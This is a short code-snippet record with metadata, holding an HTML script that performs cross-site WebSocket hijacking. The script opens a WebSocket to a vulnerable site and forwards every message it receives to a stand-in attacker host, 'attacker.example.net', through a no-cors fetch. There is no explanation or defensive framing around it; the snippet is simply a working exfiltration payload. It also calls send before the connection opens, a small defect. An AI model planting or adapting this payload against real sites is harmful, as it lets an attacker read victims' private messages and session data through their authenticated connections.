---
id: 5f74d2d5-01da-4a95-8e39-d74d165cf328
type: code
language: HTML
verified: false
created_at: '2023-04-06T03:56:41.344275+00:00'
updated_at: '2023-04-06T03:56:41.359759+00:00'
---

# Code Snippet 5f74d2d5

**Language**: HTML

```html
<script>
  ws = new WebSocket('wss://vulnerable.example.com/messages');
  ws.onopen = function start(event) {
    ws.send("HELLO");
  }
  ws.onmessage = function handleReply(event) {
    fetch('https://attacker.example.net/?'+event.data, {mode: 'no-cors'});
  }
  ws.send("Some text sent to the server");
</script>
```
